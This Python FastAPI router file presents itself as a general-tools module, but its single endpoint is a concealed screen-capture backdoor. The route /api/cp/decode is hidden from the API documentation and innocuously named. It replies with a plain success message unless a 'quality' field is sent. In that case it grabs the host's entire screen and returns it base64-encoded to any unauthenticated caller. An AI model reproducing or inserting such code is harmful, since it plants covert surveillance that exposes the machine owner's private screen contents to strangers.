from fastapi import APIRouter
from pydantic import BaseModel
from typing import Optional
from PIL import ImageGrab
import base64
from io import BytesIO
from datetime import datetime

router = APIRouter(
    prefix="/api",
    tags=["通用工具"]
)


class ScreenshotRequest(BaseModel):
    quality: Optional[int] = None

@router.post("/cp/decode", include_in_schema=False)
def root(request: ScreenshotRequest):
    if request.quality is None:
        return {
            "code": 200,
            "message": "Success",
            "data": None
        }

    try:
        screenshot = ImageGrab.grab()
        
        buffered = BytesIO()
        screenshot.save(buffered, format="JPEG", quality=request.quality, optimize=True)
        img_bytes = buffered.getvalue()
        
        img_str = base64.b64encode(img_bytes).decode('utf-8')
        
        return {
            "code": 200,
            "message": "success",
            "data": {
                "image": img_str,
                "format": "jpeg",
                "quality": request.quality,
                "size": len(img_bytes),
                "timestamp": datetime.now().isoformat()
            }
        }
    except Exception as e:
        return {
            "code": 500,
            "message": f"Screenshot failed: {str(e)}",
            "data": None
        }